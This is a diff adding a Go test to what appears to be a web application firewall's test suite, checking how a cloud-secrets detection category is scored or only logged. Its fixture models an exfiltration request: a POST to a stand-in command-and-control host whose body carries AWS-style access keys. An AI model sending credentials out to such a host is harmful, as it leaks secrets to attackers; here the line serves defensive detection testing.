@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 	"time"
@@ -255,6 +256,35 @@ func TestHybridEngine(t *testing.T) {
 		}
 		if v := eng.Inspect(r, "192.0.2.10", nil, time.Time{}); v.Blocked != c.want {
 			t.Errorf("%s: blocked=%v want %v (rules %v)", c.name, v.Blocked, c.want, v.Rules)
+		}
+	}
+}
+
+// A category in observe (Log only) scores 0, so it is not a signal; the
+// timeline still names it, as observed, since the WAF logs it.
+func TestObservedCategories(t *testing.T) {
+	// The key is built from parts so the source holds none for scanners.
+	body := "aws_access_key_id=AKIA" + "Q7XKF3MZ" + "T4R2WNVE\naws_secret_access_key=" + "Jd8kPq2vX9mL4tR7wZ1nB6yC3hF5sG0aE8uI2oK"
+	rec := Record{Method: "POST", URL: "https://c2.example.net/upload", Headers: [][]string{{"Content-Type", "text/plain"}}, Body: body}
+	for _, c := range []struct {
+		name           string
+		observe        []string
+		signal, logged bool
+	}{
+		{"observed", hybridDefaultOff, false, true},
+		{"scored", nil, true, false},
+	} {
+		eng, err := newSPMEngine([]string{"waf_h_sequence"}, nil, c.observe)
+		if err != nil {
+			t.Fatal(err)
+		}
+		r, err := buildRequest(&rec)
+		if err != nil {
+			t.Fatal(err)
+		}
+		v := eng.Inspect(r, "192.0.2.10", nil, time.Time{})
+		if slices.Contains(v.Signals, "CLOUD_SECRETS") != c.signal || slices.Contains(v.Observed, "CLOUD_SECRETS") != c.logged {
+			t.Errorf("%s: signals %v observed %v", c.name, v.Signals, v.Observed)
 		}
 	}
 }
